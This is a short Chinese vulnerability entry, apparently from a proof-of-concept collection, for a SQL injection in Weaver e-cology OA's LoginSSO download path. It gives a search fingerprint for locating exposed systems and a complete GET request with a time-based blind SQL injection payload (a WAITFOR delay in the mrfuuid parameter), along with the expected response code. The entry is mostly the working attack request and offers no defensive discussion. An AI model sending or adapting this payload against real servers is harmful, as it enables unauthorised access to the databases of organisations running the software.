# 泛微E-CologyLoginSSO存在SQL注入漏洞

- **系统**：泛微OA　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app="泛微-OA（e-cology）"`
- **请求**：`GET /weaver/weaver.email.FileDownloadLocation/login/LoginSSOxjsp/x.FileDownloadLocation?ddcode=7ea7ef3c41d67297&mrfuuid=1%27;if+db_name(1)=%27master%27+WAITFOR+delay+%270:0:5%27--+&mailid=0&a=.swf HTTP/1.1`
- **预期**：200　|　—